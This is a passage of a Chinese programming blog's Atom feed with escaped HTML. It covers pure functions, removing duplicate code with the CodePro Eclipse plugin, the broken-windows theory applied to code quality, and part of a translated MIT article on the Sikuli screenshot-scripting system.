13px;&quot;&gt;抽象力！！抽象力哪里去了？不要成了悲哀的码工。&lt;/span&gt;&lt;/span&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;strong&gt;案例六&lt;/strong&gt;：&lt;a title=&quot;发现纯函数&quot; href=&quot;http://yi-programmer.com/blog/2011-01-12_pure-code.html&quot; target=&quot;_blank&quot;&gt;发现纯函数&lt;/a&gt;。&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;text-align: left; line-height: 22px; font-family: TrebuchetMS, Arial, sans-serif; font-size: 15px;&quot;&gt;函数式程序员可能清楚什么叫纯函数。&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;text-align: left; line-height: 22px; font-family: TrebuchetMS, Arial, sans-serif; font-size: 15px;&quot;&gt;发现纯函数，就是发现系统核心逻辑，提取（抽象）成不依赖IO，不依赖全局状态的代码，重新设计纯的输入和返回的数据结构，将他们置入独立的模块。其实除了文章中说的那些好处外，发现纯函数后，逻辑会被发现整理，而通常这些逻辑通常是独一无二的，但很可能散布在各个IO的地方，提取成纯函数并与IO分开后，更利于重用，消除重复。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;PS:另外推荐Martin Fowler一本重构的好书《&lt;a href=&quot;http://book.douban.com/subject/1229923/&quot;&gt;重构&lt;/a&gt;》。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial, sans-serif; font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;img src=&quot;/uploads/2011/02/refactor_0001.jpg&quot; alt=&quot;refactor.jpg&quot; width=&quot;318&quot; height=&quot;417&quot; /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>代码质量系列之五：利用CodePro Analytic工具检测和删除重复代码——Don't Repeat Yourself</title>
   <link href="http://hackfisher.github.com/blog/2011/01/dry-codepro-analitic"/>
   <updated>2011-01-28T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/dry-codepro-analitic</id>
   <content type="html">这个系列的&lt;a title=&quot;破窗理论&quot; href=&quot;http://www.hackfisher.info/blog/?p=55&quot; target=&quot;_blank&quot;&gt;上一篇文章&lt;/a&gt;给我们介绍了破窗理论，说明代码里发现了坏味道要及时清理。而代码中最常见的坏味道就包括我们今天要说的重复代码。重复代码使得软件产品的可变更性迅速变差，复杂度增高，可读性也变差，重复的代码往往抽象度不高，说明对模型理解不够透彻。

刘未鹏同学曾经在stackoverflow.com开张不久，跑上去问过一个问题，&lt;a href=&quot;http://mindhacks.cn/2009/03/09/first-principles-of-programming/&quot;&gt;编程的首要原则(s)是什么&lt;/a&gt;?结果在得到的一大堆答案中，DRY原则(Don't Repeat Yourself)位居前列。我们今天先不谈其他的编程原则，先介绍一下DRY原则的简单实践。
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/uploads/2011/01/do_not_duplicate.jpg&quot; alt=&quot;do-not-duplicate.jpg&quot; width=&quot;482&quot; height=&quot;249&quot; /&gt;&lt;/p&gt;
如果让我例举一个我最讨厌的编程行为，最先跳出我脑海的该是复制粘贴，如果不是我用CodePro的Find Similar Code功能对代码进行了检测，大概我自己都不相信有怎么多的重复代码隐藏在工程的某些旮旯角落。首先感谢Google将其免费开放出来，官方地址在&lt;a href=&quot;http://code.google.com/javadevtools/download-codepro.html&quot;&gt;http://code.google.com/javadevtools/download-codepro.html&lt;/a&gt;。

使用说明就很简单了

1. 用Eclipse|Help|Install New Softwares功能安装这个插件。

2. 选中一些文件，或者某个文件夹，右击菜单|CodePro Tools|Find Similar Code

&lt;img src=&quot;/uploads/2011/01/step2.png&quot; alt=&quot;step2.png&quot; width=&quot;637&quot; height=&quot;364&quot; /&gt;

3. 执行查找动作，如果你是选中一个大的文件夹，Java源文件比较多的情况下，会慢一些，大概要一个小时才能好

&lt;img src=&quot;/uploads/2011/01/step3.png&quot; alt=&quot;step3.png&quot; width=&quot;968&quot; height=&quot;182&quot; /&gt;

4. 下面就可以选中某个，进行重构，清理重复代码的坏味道，如果这次没有改完的话，可以保存结果，下次继续修改时导入，就比重新执行要快的多了

5. 可以生成可读性很强的HTML报告，发送至邮件，重复代码状况一目了然。

6. 还有更多高级选项，比如对重复代码的结果设置过滤行数，更多高级用法可以在文档中找到

&lt;a href=&quot;http://download.instantiations.com/CodeProDoc/integration/latest/docs/html/gettingstarted/using_filters.html&quot;&gt;http://download.instantiations.com/CodeProDoc/integration/latest/docs/html/gettingstarted/using_filters.html&lt;/a&gt;

不过需要补充的是，清理重复代码这项工作可不是项简单的工作，有时甚至可以用艰苦来形容。当时复制粘贴起来很容易，以后重构起来就要花原来几倍的时间来改。

而且，我发现，越是烂，越是难以重用的代码，越是容易被后来的人复制粘贴，复制粘贴之后就变成了更烂的代码。总结起来，就是下面的表达式：
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong style=&quot;font-size: 18px;&quot;&gt;(x =&amp;gt; paste(copy(x)))(烂代码) == 更烂的代码&lt;/strong&gt;&lt;/p&gt;
更多参考资料：
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;&lt;span style=&quot;font-family: arial, 宋体, sans-serif;&quot;&gt;&lt;span style=&quot;line-height: 25px; font-size: 14px;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://www.cnblogs.com/wayfarer/category/272862.html&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/&lt;wbr&gt;wayfarer/category/272862.html&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;font-family: arial, 宋体, sans-serif;&quot;&gt;&lt;span style=&quot;line-height: 25px; font-size: 14px;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://timyang.net/programming/pragmatic-programmer/&quot; target=&quot;_blank&quot;&gt;http://timyang.net/&lt;wbr&gt;programming/pragmatic-&lt;wbr&gt;programmer/&lt;/wbr&gt;&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;font-family: arial, 宋体, sans-serif;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://www.javaeye.com/wiki/Design_Patterns/2061-coding_quantity&quot; target=&quot;_blank&quot;&gt;http://www.javaeye.com/wiki/&lt;wbr&gt;Design_Patterns/2061-coding_&lt;wbr&gt;quantity&lt;/wbr&gt;&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;font-family: arial, 宋体, sans-serif;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://www.ibm.com/developerworks/cn/java/cq/&quot; target=&quot;_blank&quot;&gt;http://www.ibm.com/&lt;wbr&gt;developerworks/cn/java/cq/&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span style=&quot;font-family: arial, 宋体, sans-serif;&quot;&gt;&lt;span style=&quot;line-height: 25px; font-size: 14px;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://teamojiao.javaeye.com/blog/455915&quot; target=&quot;_blank&quot;&gt;http://teamojiao.javaeye.com/&lt;wbr&gt;blog/455915&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;line-height: 25px; font-size: 14px;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://www.baiduux.com/blog/2010/11/01/from-if-else-to-switch-case-then-to-abstraction/&quot; target=&quot;_blank&quot;&gt;http://www.baiduux.com/blog/&lt;wbr&gt;2010/11/01/from-if-else-to-&lt;wbr&gt;switch-case-then-to-&lt;wbr&gt;abstraction/&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;line-height: 25px; font-size: 14px;&quot;&gt;&lt;a style=&quot;color: #005488;&quot; href=&quot;http://www.cnblogs.com/wayfarer/category/272862.html&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/&lt;wbr&gt;wayfarer/category/272862.html&lt;/wbr&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>代码质量系列之四：垃圾代码清理重构的紧急性——破窗理论</title>
   <link href="http://hackfisher.github.com/blog/2011/01/urgency_broken-windows-theory"/>
   <updated>2011-01-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/urgency_broken-windows-theory</id>
   <content type="html">可能很多人都知道时间管理里面有个&lt;a title=&quot;时间管理四象限法&quot; href=&quot;http://baike.baidu.com/view/3916978.htm&quot; target=&quot;_blank&quot;&gt;四象限法&lt;/a&gt;，根据事件的紧急性和重要性的程度，区分为四个象限。第一象限是紧急并且重要的事情，第二象限是不紧急但是重要的事情，第三象限是紧急但不重要的事情，第四象限是既不紧急也不重要的事情。对于第一类重要且紧急的事，要马上去做。对于第二类重要而不紧急的事，要重点去做。

我们前面的&quot;&lt;a title=&quot;代码质量的重要性&quot; href=&quot;http://www.hackfisher.info/blog/?p=26&quot; target=&quot;_blank&quot;&gt;代码质量系列之一：什么是代码质量&lt;/a&gt;&quot;这篇文章已经重点论述了其重要性，那么代码质量的紧急性如何呢？在这里，我借助于一个有名的理论来说明之。

&lt;strong&gt;多年前，美国心理学家詹巴斗进行了一项实验，他找了二辆一模一样的汽车，把其中一辆摆在帕罗阿尔托的中产阶级区，而另一辆停在相对杂乱的布朗克斯街区。停在布朗克斯的那一辆，他把车牌摘掉，并把顶棚打开。结果这辆车一天之内就被人偷走，而放在帕罗阿尔托的那一辆，摆了一个星期都无人问津。后来，詹巴斗用锤子把那辆车的玻璃敲了一个大洞。结果呢，仅仅过几个小时，它就不见了。&lt;/strong&gt;

&lt;strong&gt;以这项实验为基础，政治学家威尔逊和犯罪学家提出了一个&quot;&lt;/strong&gt; &lt;a title=&quot;破窗理论&quot; href=&quot;http://baike.baidu.com/view/259903.htm&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;破窗理论&lt;/strong&gt;&lt;/a&gt; &lt;strong&gt;&quot;。理论认为：如果有人打坏一个建筑物的窗户玻璃，而这扇窗户又得不到及时维修，别人就可能受到某些暗示性的纵容去打烂更多的玻璃。久而久之，这些破窗户就给人造成一种无序的感觉。结果在这种公众麻木不仁的氛围中，犯罪就会滋生、繁荣。一个房子如果窗户破了，没有人去修补，隔不久，其它的窗户也会莫名其妙地被人打破;一面墙，如果出现一些涂鸦没有被清洗掉，很快的，墙上就布满了乱七八糟、不堪入目的东西;一个很干净的地方，人们不好意思丢垃圾，但是一旦地上有垃圾出现之后，人就会毫不犹疑地抛，丝毫不觉羞愧。&lt;/strong&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/uploads/2011/01/broken_window.jpg&quot; alt=&quot;broken_window.jpg&quot; width=&quot;800&quot; height=&quot;471&quot; /&gt;&lt;/p&gt;
软件开发中也是这样： 如果你发现自己在有好些破窗户的项目里工作，会很容易产生这样的想法：&quot;这些代码的其余部分也是垃圾，我只要照着做就行了&quot; 。

上面列出的种种现象，在我们每一个人身边时有发生，而且有的问题是多次重复，给公司直接和间接地带来了无法估量的损失。造成上述种种&quot;窗户破洞&quot;的主要原因：
一是人员责任心不强，素质未能提升；其次是有章不循，有法不依；从而造成经营和管理上出现个别无序状况。

如果发现了一个破的窗户，不及时去修理，管理者也不作为，就会造成更大的麻烦。无视垃圾代码就会造成更多的垃圾代码，越来越多，哪怕只是短时间的，破窗理论说明了及时清理重构垃圾代码的紧急性，应该被放在程序员时间管理的第一象限。

其实，管理学中还有很多其他生动的故事和理论可以被应用到代码质量的管理方面，比如：

&lt;a title=&quot;蛇蛙原理&quot; href=&quot;http://zhidao.baidu.com/question/36159237.html&quot; target=&quot;_blank&quot;&gt;蛇蛙原理&lt;/a&gt;

不希望发生的事情，决不妥协（小孩子哭不要管他，明明不希望他以哭为手段要挟自己，就不要妥协）；希望发生的事情，奖赏他，起到示范作用，让更多的人达到希望看到的目标。

&lt;a title=&quot;亚当斯现象&quot; href=&quot;http://baike.baidu.com/view/839750.htm&quot; target=&quot;_blank&quot;&gt;亚斯兰现象&lt;/a&gt;

将一群羊用铁丝网圈起来，每天都有羊跳出铁丝网逃走，羊群的数量不断减少。后来将铁丝网通上电，开始还是有羊不断冲击电网，也有的羊因此而死掉。但是，慢慢的冲击电网的羊就越来越少了，羊群里的羊都远离电网，羊的数量也不再减少了。再后来，铁丝网保留，但是已经不再通电了，可是羊群依然不再靠近铁丝网。最后，连铁丝网都撤掉了，但是羊已经习惯了在这个区域内活动了，不会在走出圈子外去了。这种现象在生物学上叫做&quot;亚斯兰&quot;现象。

同样的道理，在医学上也有广泛的使用，有一些癌症患者每天需要服用大量的镇痛剂，但是镇痛剂服用多了是有很严重的副作用的，所以有一些医生，就用维生素和钙片代替镇痛剂给患者服用，也起到了镇痛的效果。就药理来讲，应该是没有任何镇痛作用的，但是患者却能过感受到疼痛减轻，这也是&quot;亚斯兰&quot;原理。

这种原理或是现象应用在管理学上也是非常有效的，在管理最初就要设定好规则，也就是电网，只要违规一定会受罚，而且要坚持，那么每次违规都会被电到，时间就会养成一个习惯。只在规则允许的范围内活动做事情，那么就算，以后规则撤了，习惯已经养成了，自然也就不会违规了，关键就在第一次违规的惩罚，好多的管理者都会说：&quot;念你是初犯，姑且放你一马，下次不许了！&quot;但是，这就管理带头违规的开始，有了第一次的，也就会有第二次......

先画圈，再通电，后断电，再撤圈...

&lt;a title=&quot;火炉法则&quot; href=&quot;http://zhidao.baidu.com/question/102512271.html&quot; target=&quot;_blank&quot;&gt;火炉法则&lt;/a&gt;

所谓&quot;火炉法则&quot;，就是把&quot;火炉&quot;烧得红红的，放在那里，本身并不会主动烫人，但只要有人敢于触摸，它就必烫无疑，不会顾及触摸者的身份，人人平等，谁摸烫谁，而且立即处罚，没有下不为例。
</content>
 </entry>
 
 <entry>
   <title>图片驱动的计算机技术(译文)</title>
   <link href="http://hackfisher.github.com/blog/2011/01/picture-driven-tech-translate"/>
   <updated>2011-01-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/picture-driven-tech-translate</id>
   <content type="html">&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;widows: 2; text-transform: none; text-indent: 0px; border-collapse: separate; font: medium Simsun; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; word-spacing: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;&quot;&gt;这是MIT上介绍Sikuli的一篇文章&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;Sikuli的网站： &lt;span style=&quot;line-height: 18px; font-family: Tahoma, Helvetica, Arial, sans-serif; color: #353535;&quot;&gt;http://sikuli.org/&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;&lt;span style=&quot;line-height: 18px; font-family: Tahoma, Helvetica, Arial, sans-serif; color: #353535;&quot;&gt;延伸阅读：http://blog.vgod.tw/2010/01/25/change-the-world/&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;---------------------&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;---------------------&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: medium;&quot;&gt;&lt;strong style=&quot;font-weight: bold;&quot;&gt;图片驱动的计算机技术&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;译者：HackFisher&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;原文：&lt;a style=&quot;color: #108ac6; text-decoration: underline;&quot; href=&quot;http://web.mit.edu/newsoffice/2010/screen-shots-0120.html&quot;&gt;http://web.mit.edu/newsoffice/2010/screen-shots-0120.html&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;margin: 0px; padding: 0px;&quot;&gt;译言：&lt;a style=&quot;color: #108ac6; text-decoration: underline;&quot; href=&quot;http://article.yeeyan.org/view/YangtseFisher/75052&quot;&gt;http://article.yeeyan.org/view/YangtseFisher/75052&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;直到1980年代，使用一个计算机程序还意味着你要记住很多的命令，一次性的把它们打出来，仅仅得到反馈的几行文本。图形用户界面，或者称为GUI，改变了这些。通过表示程序，把程序中函数和数据表示成二维的图片--就像图标，按钮和窗口一样--GUI使得原本需要耗费体力仔细记忆的内容变得直观和容易理解。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;但是，在GUI使计算机用户处理事情更加容易的同时，对于计算机程序员来说，事情的容易程度并得到没有任何改进。在GUI控件下面的是大量的程序代码，通常情况下，构建和自定义一个程序，或者把不同的程序组合起来，仍然意味着要处理那些代码。MIT计算机科学人工智能实验的研究员们希望改变这种状况，他们开发了一个可以让人们利用GUI的截图来编写程序的系统。最终，这个系统将会使得那些没有掌握任何计算机语言的普通用户创建他们自己的程序成为可能。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;这个由副教授Rob Miller，研究生张琮翔，以及MarLand大学的Tom Yeh设计的脚本语言系统，叫做Sikuli, 在墨西哥惠慈尔土著人的语言中这是&quot;上帝之眼&quot;的意思。在去年九月ACM关于用户界面的最顶尖会议UIST上拿到Best Student Paper Award的一篇论文中，研究者展示了Sikuli可以通过构造脚本，简短的程序来扩展其他程序的功能。使用Sikuli需要对通用的脚本语言Python有一定了解。但是他不需要对它所扩展的那些语言的知识有任何了解。当程序员需要触发某个应用程序的功能时，她只需要在相关的GUI上面画个框框，点击鼠标截取图片，把它直接插入Python代码的中去。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;假设，比方说，某个Pyhon程序员想要写一个脚本，可以当她乘坐的公共汽车正好转过某个弯时，程序自动发送消息到她的手机里。如果当地交通管理局维护了一个网站，可以描述汽车标记在Google地图上行驶的过程，那么这个程序员就可以指定当汽车的标记进入某个指定的地图区域时发送消息。不是使用难以理解的术语来描述标记，或者指定地图区域边界的地理坐标，取而代之程序员可以简单的将截图加入脚本命令中：当(标记)到达(拐弯处)，给我发送消息。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&quot;我看到那个的时候，我想， '天哪， 你可以做到？'&quot;Allen Cypher说到，他是一位IBM的Almaden研究中心专攻人机交互的研究员。&quot;我从没想过你可以做任何像那样的事情。他们不仅做了，而且做得很好。已经是实用性的了。我想立即开始尝试那些以前不能做的事情。&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;在同一篇论文中，研究者们展示了一个面向更广受众的Sikuli应用。一个计算机用户希望学习使用某个计算机程序难以理解的特征，可以借助于GUI的截屏--也就是说，用一个像Adobe Photoshop中套索工具一样的按钮--在网络上来搜索相关内容。在一个允许人们在网络上使用这个系统的实验中，研究者发现用户们用可视化图片的方法来找到有用的内容只需要花费原来一般的时间。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;使用Sikuli的程序员不需要了解GUI内部的代码，同样，Sikuli对它毫无了解。取而代之，Sikuli使用计算机视觉算法来分析屏幕上正在发生的事情。&quot;它作为一个代理，像人类一样看着屏幕&quot;，Miller说到。这意味着，不需要任何额外的改动，Sikuli就可以在任何有图形界面的应用上工作。它不需要在不同的文件格式或者计算机语言之间转换，因为，就像人一样，它只是看着屏幕上的像素。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;在一篇将要在人机交互领域最高会议CHI上发表的论文中，研究者描述了Sikuli的一个新的应用，瞄准了大型软件开发项目中的程序员们。在一个这样的项目工程中，新的代码每天都在累计，并且其中的任何一行代码都可能导致之前开发的GUI功能不正确。理想状态下，一天工作结束后，测试人员将会跑遍整个应用程序，点击虚拟按钮确保正确的窗口和图标将会弹出。因为这样做将会极高的耗费时间，然而，也许要等到对应用程序进行了长时间并且高成本的质量保证测试后，被破坏的GUI才会被发现。&lt;/span&gt;&lt;/p&gt;
